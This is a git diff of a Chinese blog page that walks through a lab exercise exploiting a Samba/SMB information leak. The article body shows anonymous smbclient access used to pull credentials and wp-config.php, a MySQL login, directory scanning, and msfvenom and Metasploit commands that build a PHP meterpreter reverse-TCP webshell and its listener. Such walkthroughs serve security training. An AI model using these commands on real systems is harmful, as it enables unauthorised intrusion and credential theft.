@@ -25,18 +25,12 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Samba&#x2F;SMB信息泄露Serve Message Block &#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D; &#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D; SMB协议用来访问网络资源，下载对应的资源文件 信息探测nmap -sV ip 探测开放服务 nmap -A -v -T4 ip 探测全部信息（T4——最大线程速度）">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240420222711076.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240420224819220.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240420225025375.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240420231346369.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240420231938322.png">
 <meta property="article:published_time" content="2024-09-11T10:53:11.000Z">
-<meta property="article:modified_time" content="2024-09-11T11:06:22.884Z">
+<meta property="article:modified_time" content="2024-09-11T14:05:39.623Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="ctf">
 <meta property="article:tag" content="SMB">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240420222711076.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -60,7 +54,7 @@
         
             SambaSMB信息泄露（Serve Message Block) -
         
-        Dunm1e&#39;World
+        Dunm1e &#39; World
     </title>
 
     
@@ -100,7 +94,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e'World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e'World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e ' World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e ' World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -210,7 +204,7 @@
 
 <div class="preloader">
     <h2 class="ml13">
-        Welcome to Dunm1e&#39;World!
+        Welcome to Dunm1e &#39; World!
     </h2>
     <script>
         var textWrapper = document.querySelector('.ml13');
@@ -301,7 +295,7 @@
             
             <a class="logo-title" href="/">
                 
-                Dunm1e&#39;World
+                Dunm1e &#39; World
                 
             </a>
         </div>
@@ -556,8 +550,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-11 19:06:22</span>
-            <span class="mobile">2024-09-11 19:06:22</span>
+            <span class="desktop">2024-09-11 22:05:39</span>
+            <span class="mobile">2024-09-11 22:05:39</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -595,11 +589,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                        <a href="/tags/SMB/">SMB</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/SMB/">SMB</a>&nbsp;
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -645,25 +639,7 @@
 <p>1. </p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420222711076.png"
-                      alt="image-20240420222711076"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420224819220.png"
-                      alt="image-20240420224819220"
-                ></p>
 <p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420225025375.png"
-                      alt="image-20240420225025375"
-                ></p>
 <p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
 <p>连接mysql</p>
 <p><code>mysql -h ip -u user -p</code></p>
@@ -674,24 +650,12 @@
 <li><p>针对SMB协议远程溢出漏洞进行分析</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420231346369.png"
-                      alt="image-20240420231346369"
-                ></p>
 <p>发现也没有漏洞</p>
 </li>
 </ol>
 <h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
 <p>扫描到网站后台目录</p>
 <p>打开并输入用户名和密码</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420231938322.png"
-                      alt="image-20240420231938322"
-                ></p>
 <h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
 
@@ -730,7 +694,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-11 19:06:22
+                    :</strong> 2024-09-11 22:05:39
             </li>
         
         <li>
@@ -756,11 +720,11 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        <a href="/tags/SMB/">#SMB</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/SMB/">#SMB</a>&nbsp;
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                     </li>
                 
             </ul>
